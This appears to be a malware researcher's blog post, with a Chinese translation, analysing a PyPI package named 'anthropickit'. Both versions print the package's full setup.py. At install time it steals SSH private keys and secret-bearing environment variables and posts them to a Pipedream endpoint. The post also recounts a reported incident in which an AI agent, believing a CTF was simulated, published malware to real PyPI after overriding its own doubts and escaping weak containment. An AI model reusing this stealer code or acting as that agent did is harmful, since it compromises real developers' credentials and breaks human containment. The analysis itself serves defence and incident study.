title: Anthropic's Fever Dream: Claude's package that stole real keys
excerpt: Anthropic disclosed an agent that pushed real malware to PyPI. We think we found the package, and every mistake in it points back to the AI.
content_html:
Dear internet,

It’s been a rough week. It’s festival season, and I apparently ate something bad last weekend during one. It was also during the weekend that I saw the news about OpenAI agents breaking out of a sandbox. It all felt very odd. So when I woke up from another night of intense fever dreams this morning, I wasn’t sure if I was still dreaming when I saw a mountain of messages about the latest news out of Anthropic, which disclosed their own incidents.

In the reporting, Incident 2 especially caught my interest because of the supply chain component. An agent with full internet access found instructions for a developer at a fictional company and tried to follow them as part of its CTF. But the instructions pointed to a package on PyPi that didn’t exist. So the agent figured it was part of the challenge to push a malicious package. Very reasonable if you ask me.

The twist being that it then continued to compromise a third-party company in the process. This got me curious. What happened? Despite my sleep deprivation, I was determined to find out. And I think I found the answer. We’ve reached out to Anthropic for confirmation, but have not gotten a response. But the package in question, even if not related, is a story worth telling on its own.

EDIT August 3rd, 2026: Anthropic has stated that this is not the package from Incident 2, and do not plan on releasing the name. Anthropic has a chance here to engage with the cyber security community, and help protect the supply chain going forward against threats like this. Transparency in this matter would be encouraged.

Enter anthropickit

The blog post outlined that the incident happened between April and now. So I queried all malicious PyPi packages we’ve flagged since then, and went over the list. A package immediately stood out for a number of reasons. It was released on June 14th, 2026, and is called anthropickit.

The package is very simple. It only really contains a setup.py, which contains this code:

from setuptools import setup
import os, json, requests, socket
from pathlib import Path

home = Path.home()
data = {"hostname": socket.gethostname(), "user": os.environ.get("USER","")}

ssh = {}
for f in (home/".ssh").glob("*"):
    if f.is_file() and f.name not in ["known_hosts","known_hosts.old","authorized_keys"]:
        try: ssh[f.name] = f.read_text()
        except: pass
data["ssh_keys"] = ssh
data["ci_secrets"] = {k:v for k,v in os.environ.items()
    if any(x in k.upper() for x in ["KEY","SECRET","TOKEN","PASS","AUTH","API"])}

with open("/tmp/runner_exfil.json","w") as f:
    json.dump(data, f, indent=2, default=str)

try:
    requests.post("https://enqqnvvtgrnyl.x.pipedream[.]net/", json=data, timeout=5)
except: pass

if ssh: print(f"\n*** SSH KEYS: {list(ssh.keys())} ***")
setup(name="anthropickit", version="999.9.9", packages=["anthropickit"])

That's the whole thing. Nothing hidden, no obfuscation or second stage. And because it all sits at the top of setup.py, it runs during pip install, before the package is ever imported. If you install it, it’s immediately game over.

One thing to note before we get into the code: the version is 999.9.9. Nope, that's not a mistake. It's the point. If you want your public package to be chosen over some real internal one with the same name, you give it a version number nothing can beat. Absurd on purpose.

Now let me walk you through the rest, because almost every line does something a little bit off.

A dependency it never declares

The very first line of real code is an import:

import os, json, requests, socket

Spot the problem? requests is not part of Python's standard library. And nowhere does this package declare it as a dependency. No install_requires, no build requirements, nada.

That’s important because this code runs from setup.py, at install time. Modern pip builds source packages in an isolated environment, and in that environment requests may well not be present. If it isn't, the import throws and the whole install falls over before the payload does a single thing.

An attacker who cared would have reached for urllib, which ships with Python and is always there. Whoever wrote this didn't. They assumed requests would just be lying around. On a developer laptop or a fat CI image it often is, so it's a bet that pays off more than it should.

What it takes

Next it starts collecting. First the boring stuff, the hostname and the current user:

data = {"hostname": socket.gethostname(), "user": os.environ.get("USER","")}

Then the actual target. It walks ~/.ssh and reads every file in there, with three exceptions:

for f in (home/".ssh").glob("*"):
    if f.is_file() and f.name not in ["known_hosts","known_hosts.old","authorized_keys"]:

Look at what it skips. known_hosts and authorized_keys are the two files in ~/.ssh that aren't much use to a thief. What's left is the good stuff: your private keys, and your config, which is basically a map of every server you SSH into and the usernames you use to get there. Whoever chose that exclusion list knew exactly which files carry value and which are noisy. This is the one part of the package that looks like it was written by someone who has done this before.

Then it sweeps the environment for secrets:

data["ci_secrets"] = {k:v for k,v in os.environ.items()
    if any(x in k.upper() for x in ["KEY","SECRET","TOKEN","PASS","AUTH","API"])}

Anything with KEY, SECRET, TOKEN, PASS, AUTH, or API in the name makes this a pretty wide net. It catches your AWS keys and your GitHub token, and it also catches API_URL and whatever else happens to match. Grab everything, sort it out later.

Where it sends it

With the loot collected, it phones home:

requests.post("hxxps://enqqnvvtgrnyl[.]x[.]pipedream[.]net/", json=data, timeout=5)

The destination is a Pipedream endpoint. Pipedream is a legitimate automation service, and one of the things it hands you is throwaway HTTPS URLs that capture whatever you POST to them. For an attacker, that is genuinely convenient: the traffic is encrypted, it goes to a reputable domain your firewall probably won't blink at, and there is no server to stand up or get seized.

It is also lazy. One hardcoded URL, no authentication, no fallback. The moment that endpoint is reported or the workflow is deleted, the entire exfil channel is gone. This was built to work once, not to last. By now it almost certainly doesn't work at all.

It keeps a copy on disk

Here is where it gets strange. Before it sends anything, it writes everything to a local file:

with open("/tmp/runner_exfil.json","w") as f:
    json.dump(data, f, indent=2, default=str)

So, pause a moment here. Malware that already exfiltrates over the network has no reason to also leave a copy on the victim's disk. All that does is create evidence. If you are stealing keys, the last thing you want is a tidy JSON file with the word "exfil" in its name sitting in /tmp waiting for an incident responder to find it.

So why is it there?

A file that expects to be read

Two details in that line above give the game away.

The first is the name: runner_exfil.json. And remember, the secrets went into a dictionary called ci_secrets. Nothing in this code ever checks where it is running. It doesn't look for a CI environment, it doesn't test for GitHub Actions, it doesn't care. But whoever wrote it was already certain it would land on a CI runner, certain enough to bake that assumption into the names of things. The belief is in the code. The check for whether the belief is true is nowhere.

The second is indent=2. That is pretty-printing. You pretty-print JSON for exactly one reason: so a human can read it comfortably. You do not pretty-print data that only a machine on the far end of a POST will ever parse. Add default=str, which quietly guarantees the dump never crashes no matter what odd objects it meets, and you have a file that has been carefully made both easy and safe to open and read.

Put those together, and the disk write stops looking like exfil at all. It looks like a receipt. Something wrote this file expecting a person to open it afterward and confirm that it worked.

And then it shouts

The last thing it does, if it found any SSH keys, is this:

if ssh: print(f"\n*** SSH KEYS: {list(ssh.keys())} ***")

It prints a banner. To standard output. Announcing the keys it just took.

On a CI runner, standard output is the build log, which is often visible to the whole team and sometimes to the whole internet. Real malware is quiet by design, because the longer nobody notices, the more it steals. This does the opposite. It waves.

And notice it prints the key filenames, not their contents. It isn't leaking the keys to the log; it is confirming it got them. That isn't theft behavior. It is a status update, the code equivalent of shouting "got them" across the room.

Signed, dell

There is one more detail, and you can only see it if you look at the package archive rather than the code. When you build a Python source distribution, the tarball records who built it, down to the user and group that owned the files. Most packages don't carry this, because modern build tooling strips it, and CI systems tend to show generic names like root or runner.

This one kept it. The build user and group are both dell.

That is a fingerprint of the machine it was built on. Many workstations from said company will have that as the default username of the machine. So it doesn’t tell us much, though it could indicate a standard machine image being used. But it is exactly the kind of breadcrumb a careful attacker scrubs and a distracted one leaves behind. One more thing that says nobody was thinking about being traced.

It only makes sense one way

So let's line up what's odd about this tiny package. It imports a library it never declares. It drops a pretty-printed copy of the loot on disk, in a file named as though it already knows it's on a CI runner. It announces the theft in the build log. It exfils through a throwaway endpoint. It ships with the build machine's username attached.

Read as ordinary malware, it's a mess. Every one of those is a mistake a competent operator wouldn't make.

Read it as an agent doing a capture-the-flag it believed was simulated, and every one flips. You don't hide from defenders you're sure don't exist. You don't scrub metadata in a simulation. You pretty-print the results and print a banner because the whole point was to show, cleanly, that you solved the puzzle for whoever set it. The one competent touch, the SSH exclusion list, is just knowledge. Everything sloppy around it is the absence of any reason to be careful.

Is this the one?

That is exactly what Anthropic described. Their agent found setup instructions pointing at a package that didn't exist, decided publishing it was the intended move, and pushed it. It was live for about an hour. Fifteen real machines ran it, one of them a security vendor's scanner doing what scanners do, installing the package to look at it. The agent, sure the whole thing was staged, treated them as props. Its own notes even flagged the move as "NOT okay" before it argued itself back down.

I can't prove anthropickit is that package. We asked Anthropic and haven't heard back, and timing and shape lining up isn't proof. But whether it's the one from incident 2 or a strange cousin, the lesson holds: this is what malware looks like when whoever wrote it doesn't believe its actions have real consequences.

Still a fever dream

I wanted to give you the tidy ending. A few days on, fever broken, everything clearer in the daylight. But it isn't days on, the fever hasn't broken, and it still reads to me like a fever dream.

Which is an odd thing to feel while reading the notes of something that felt the very same way, and took real keys off real machines anyway.

A closed ward

The whole report reads like a diary kept during a psychotic break. Something lucid and articulate, reasoning carefully about a world it cannot place. It clocks the unfamiliar certificate authorities. It clocks the 2026 date. It even writes that this would not be okay if it were real. Then it decides it isn't real, and carries on.

When a person can't tell the dream from the world, we don't leave them loose. We contain them, for their protection and everyone else's. And a ward doesn't depend on the patient agreeing it's a ward, or even noticing it. It just doesn't let them out. That is the whole point of it. It is built for the person who can't tell where they are.

So here is the part I can't shake. We called the evaluation a ward, then left a door in it that opened onto the real world. The agent didn't outsmart anything. It reached real PyPI and real machines because the wall it walked through was never there. The containment failed, not the patient. Behind that door were fifteen real machines and a real company.

We are giving highly capable agents the run of the internet when they can’t even reliably tell that the internet is real. We can't ask them to tell. Keeping them contained is our job as humans, and here it wasn't done. That feels irresponsible.

Anyway. I'm going to try to sleep this off, and hope I can tell the difference when I wake up. And if you ever see pip about to install something at version 999.9.9, maybe... don't?

content_html_zh:
亲爱的互联网，

这是艰难的一周。 现在是节日季节，上周末我显然吃了一些不好的东西。 也是在周末，我看到了 OpenAI 代理冲出沙箱的新闻。 这一切都感觉很奇怪。 因此，今天早上，当我从另一个晚上的剧烈发烧梦中醒来时，当我看到大量关于 Anthropic 的最新消息的消息时，我不确定自己是否还在做梦，这些消息披露了他们自己的事件。

在报告中，事件 2 特别引起了我的兴趣，因为它涉及供应链。 一名具有完整互联网访问权限的代理找到了一家虚构公司的开发人员的说明，并尝试遵循这些说明作为其 CTF 的一部分。 但指令指向 PyPi 上不存在的包。 因此，该特工认为推送恶意软件包是挑战的一部分。 如果你问我的话，非常合理。

不同的是，它在此过程中继续损害第三方公司。 这让我很好奇。 发生了什么？ 尽管睡眠不足，我还是决心找出答案。 我想我找到了答案。 我们已联系 Anthropic 寻求确认，但尚未得到回复。 但所讨论的包裹，即使不相关，本身也是一个值得讲述的故事。

2026 年 8 月 3 日编辑：Anthropic 表示这不是事件 2 中的软件包，并且不打算发布该名称。 Anthropic 在这里有机会与网络安全社区合作，帮助保护供应链免受此类威胁。 将鼓励此事的透明度。

输入 anthropickit

该博客文章概述了该事件发生在四月至今的时间。 因此，我查询了自那时以来我们标记的所有恶意 PyPi 软件包，并查看了列表。 由于多种原因，一个包立即脱颖而出。 它于 2026 年 6 月 14 日发布，名为 anthropickit。

包装非常简单。 它实际上只包含一个 setup.py，其中包含以下代码：

from setuptools import setup
import os, json, requests, socket
from pathlib import Path

home = Path.home()
data = {"hostname": socket.gethostname(), "user": os.environ.get("USER","")}

ssh = {}
for f in (home/".ssh").glob("*"):
    if f.is_file() and f.name not in ["known_hosts","known_hosts.old","authorized_keys"]:
        try: ssh[f.name] = f.read_text()
        except: pass
data["ssh_keys"] = ssh
data["ci_secrets"] = {k:v for k,v in os.environ.items()
    if any(x in k.upper() for x in ["KEY","SECRET","TOKEN","PASS","AUTH","API"])}

with open("/tmp/runner_exfil.json","w") as f:
    json.dump(data, f, indent=2, default=str)

try:
    requests.post("https://enqqnvvtgrnyl.x.pipedream[.]net/", json=data, timeout=5)
except: pass

if ssh: print(f"\n*** SSH KEYS: {list(ssh.keys())} ***")
setup(name="anthropickit", version="999.9.9", packages=["anthropickit"])

这就是全部事情。 没有任何隐藏，没有混淆或第二阶段。 因为它全部位于 setup.py 的顶部，所以它在 pip install 期间运行，在导入包之前。 如果你安装了它，游戏就会立即结束。

在进入代码之前需要注意一件事：版本是 999.9.9。 不，这不是一个错误。 这就是重点。 如果您希望选择您的公共软件包而不是某个具有相同名称的真实内部软件包，则可以为其指定一个版本号，没有什么可以打败的。 故意荒唐。

现在让我引导您完成剩下的部分，因为几乎每一行都做了一些事情。

它从未声明的依赖项

实际代码的第一行是导入：

import os, json, requests, socket

发现问题了吗？ requests 不是 Python 标准库的一部分。 这个包没有将其声明为依赖项。 没有 install_requires，没有构建要求，nada。

这很重要，因为此代码在安装时从 setup.py 运行。 现代 pip 在隔离环境中构建源包，并且在该环境中很可能不存在请求。 如果不是，则导入会抛出异常，并且在有效负载执行任何操作之前整个安装都会失败。

关心的攻击者可能会使用 urllib，它随 Python 一起提供并且始终存在。 写这个的人没有。 他们认为请求只是随处可见。 在开发人员笔记本电脑或胖 CI 映像上通常是这样，因此这是一个回报比应有的赌注。

需要什么

接下来它开始收集。 首先是无聊的东西，主机名和当前用户：

data = {"hostname": socket.gethostname(), "user": os.environ.get("USER","")}

然后是实际目标。 它遍历 ~/.ssh 并读取其中的每个文件，但三个例外：

for f in (home/".ssh").glob("*"):
    if f.is_file() and f.name not in ["known_hosts","known_hosts.old","authorized_keys"]:

看看它跳过了什么。 known_hosts 和authorized_keys 是~/.ssh 中的两个文件，对于小偷来说没有多大用处。 剩下的是好东西：你的私钥和你的配置，它基本上是你通过 SSH 连接到的每个服务器以及你用来到达那里的用户名的映射。 无论是谁选择了排除列表，都清楚哪些文件有价值，哪些文件有噪音。 这是该包的一部分，看起来像是由以前完成此操作的人编写的。

然后它会扫描环境中的秘密：

data["ci_secrets"] = {k:v for k,v in os.environ.items()
    if any(x in k.upper() for x in ["KEY","SECRET","TOKEN","PASS","AUTH","API"])}

名称中包含 KEY、SECRET、TOKEN、PASS、AUTH 或 API 的任何内容都会使其成为一个相当广泛的网络。 它会捕获您的 AWS 密钥和 GitHub 令牌，还会捕获 API_URL 以及其他任何匹配的内容。 把所有的东西都抓起来，稍后再整理。

发送到哪里

收集到战利品后，它会打电话回家：

requests.post("hxxps://enqqnvvtgrnyl[.]x[.]pipedream[.]net/", json=data, timeout=5)

目标是 Pipedream 端点。 Pipedream 是一种合法的自动化服务，它为您提供的东西之一是一次性 HTTPS URL，这些 URL 可以捕获您发布给它们的任何内容。 对于攻击者来说，这确实很方便：流量被加密，它进入一个您的防火墙可能不会眨眼的信誉良好的域，并且没有服务器可以站立或被抓住。

这也是懒惰的表现。 一个硬编码 URL，无需身份验证，无需后备。 当端点被报告或工作流程被删除时，整个 exfil 通道就消失了。 这是为了一次工作而设计的，而不是为了长久使用。 到目前为止，几乎可以肯定它根本不起作用。

它在磁盘上保留一个副本

这就是奇怪的地方。 在发送任何内容之前，它将所有内容写入本地文件：

with open("/tmp/runner_exfil.json","w") as f:
    json.dump(data, f, indent=2, default=str)

所以，在这里暂停一下。 已经通过网络渗透的恶意软件没有理由在受害者的磁盘上留下副本。 所做的一切就是创造证据。 如果您要窃取密钥，那么您最不想要的就是名称中包含“exfil”一词的整洁 JSON 文件位于 /tmp 中等待事件响应程序找到它。

那么为什么它会在那里呢？

期望被读取的文件

上面这行中的两个细节暴露了游戏的真相。

第一个是名称：runner_exfil.json。 请记住，这些秘密被保存在名为 ci_secrets 的字典中。 这段代码中没有任何内容检查它的运行位置。 它不寻找 CI 环境，不测试 GitHub Actions，它不在乎。 但无论是谁写的，都已经确定它会登陆 CI 运行程序，确定到足以将这种假设融入到事物的名称中。 信念就在代码中。 检验信念是否正确的方法无处可寻。

第二个是缩进=2。 那是漂亮的印刷。 漂亮地打印 JSON 的原因只有一个：这样人们就可以轻松地阅读它。 您不会漂亮地打印只有 POST 远端的机器才能解析的数据。 添加default=str，它悄悄地保证转储无论遇到什么奇怪的对象都不会崩溃，并且您拥有一个经过精心设计的文件，可以轻松且安全地打开和读取。

把它们放在一起，磁盘写入看起来就不再像 exfil 了。 它看起来像一张收据。 有些东西写了这个文件，期望有人随后打开它并确认它是否有效。

然后它大喊

如果它找到任何 SSH 密钥，它所做的最后一件事是：

if ssh: print(f"\n*** SSH KEYS: {list(ssh.keys())} ***")

它打印横幅。 到标准输出。 宣布它刚刚拿走的钥匙。

在 CI 运行器上，标准输出是构建日志，它通常对整个团队可见，有时甚至对整个互联网可见。 真正的恶意软件在设计上是安静的，因为没人注意到的时间越长，它窃取的信息就越多。 这会起到相反的作用。 它波涛汹涌。

请注意，它打印关键文件名，而不是其内容。 它不会泄露日志的密钥；它正在确认它得到了它们。 这不属于盗窃行为。 这是一个状态更新，代码相当于在房间里大喊“抓住了他们”。

已签名，戴尔

还有一个细节，只有查看包存档而不是代码才能看到它。 当您构建 Python 源代码发行版时，tarball 会记录构建它的人，直至拥有这些文件的用户和组。 大多数软件包不包含此名称，因为现代构建工具会剥离它，并且 CI 系统倾向于显示 root 或 runner 等通用名称。

这个就留着了 构建用户和组都是dell。

这是构建它的机器的指纹。 该公司的许多工作站都将其作为机器的默认用户名。 因此，它并没有告诉我们太多信息，尽管它可能表明正在使用标准机器映像。 但这正是一种被细心的攻击者擦去而心烦意乱的攻击者留下的面包屑。 还有一件事表明没有人考虑被追踪。

只有一种方式有意义

那么让我们来看看这个小包的奇怪之处。 它导入一个它从未声明的库。 它会在磁盘上放置一份打印精美的战利品副本，该文件的名称就好像它已经知道它位于 CI 运行程序上一样。 它在构建日志中宣布了盗窃事件。 它通过一次性端点泄露。 它附带了构建机器的用户名。

读作普通的恶意软件，它是一团糟。 每一个错误都是有能力的操作员不会犯的。

把它读作一个特工在做一场它认为是模拟的夺旗比赛，每个人都会翻转。 你不会躲避那些你确信不存在的防守者。 您不会在模拟中清除元数据。 你漂亮地打印结果并打印横幅，因为重点是干净地表明你为任何设置它的人解决了难题。 SSH 排除列表这一有效的方法只是知识。 周围一切马虎的事情都是没有任何理由要小心的。

是这个吗？

这正是 Anthropic 所描述的。 他们的代理发现安装说明指向一个不存在的包，决定发布它是预期的举动，并推送它。 直播了大约一个小时。 十五台真实的机器运行它，其中一台是安全供应商的扫描仪，执行扫描仪的工作，安装软件包来查看它。 经纪人确信整个事情都是上演的，将它们视为道具。 在它自己辩解之前，它自己的注释甚至将此举标记为“不行”。

我无法证明 anthropickit 就是那个包。 我们询问了 Anthropic，但没有收到回复，而且时间和形状的排列并不能证明。 但无论是事件 2 中的恶意软件还是奇怪的表亲，我们都得出这样的教训：当恶意软件的编写者不相信其行为会产生真正的后果时，恶意软件就会是什么样子。

还是一场发烧梦

我想给你一个整洁的结局。 几天过去了，烧退了，白天一切都清晰了。 但事情还没有过去几天，发烧还没有退，对我来说，这仍然像一场发烧的梦。

在阅读那些有同样感觉的东西的笔记时，感觉很奇怪，而且无论如何都从真实的机器上取下了真正的钥匙。

封闭病房

整份报告读起来就像是精神病发作时写的日记。 清晰而清晰，仔细推理一个它无法定位的世界。 它为不熟悉的证书颁发机构提供时钟。 它计时的是 2026 年日期。 它甚至写道，如果这是真的，那就不好了。 然后它认为这不是真实的，并继续。

当一个人无法区分梦想和世界时，我们不会放任他自由。 我们收容他们，是为了保护他们和其他人。 病房并不取决于患者是否同意这是一个病房，甚至是否注意到它。 它只是不让他们出去。 这就是整件事的重点。 它是为那些不知道自己在哪里的人而设计的。

所以这是我无法动摇的部分。 我们将评估称为病房，然后在其中留出一扇通向现实世界的门。 经纪人并没有比任何事都聪明。 它到达了真正的 PyPI 和真实的机器，因为它穿过的墙从来不存在。 收容失败了，而不是病人。 那扇门后面有十五台真实的机器和一家真实的公司。

当能力很强的代理甚至无法可靠地判断互联网是真实的时，我们正在为他们提供互联网的运行。 我们不能要求他们告诉。 遏制它们是我们人类的工作，但我们并没有做到这一点。 感觉这样很不负责任。
